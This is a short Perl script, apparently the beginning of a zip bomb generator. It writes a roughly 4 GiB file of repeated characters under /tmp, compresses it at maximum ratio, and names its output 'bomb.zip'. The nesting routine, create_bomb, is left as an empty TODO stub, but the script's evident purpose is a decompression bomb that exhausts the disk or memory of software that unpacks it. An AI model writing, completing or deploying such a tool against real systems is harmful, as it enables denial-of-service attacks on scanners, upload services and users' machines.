#!/usr/bin/perl
use strict;
use warnings;

my $depth = 6;
my $width = 17;

my $zip_file = 'bomb.zip';
my $tmp_dir = '/tmp/zip_bomb';
my $file_name = '0.txt';

my $mb = 1048576;


sub create_tmp_dir {
    `mkdir -p $tmp_dir`
}

sub create_zip {
    (my $target, my $source) = @_;
    `zip -rmj9 $target $source`
}

sub create_file {
    my $file_path = "$tmp_dir/$file_name";
    open FILE, ">$file_path" or die "unable to open $file_path $!";
    foreach my $i (0..(1024 * 4) - 2) {
        print FILE '1'x$mb;
    }
    print FILE '1'x($mb - 1);
    close FILE;

    create_zip("$tmp_dir/0-0.zip", $file_path);
}

sub create_bomb {
    # TODO
}

create_tmp_dir();
create_file();
create_bomb();
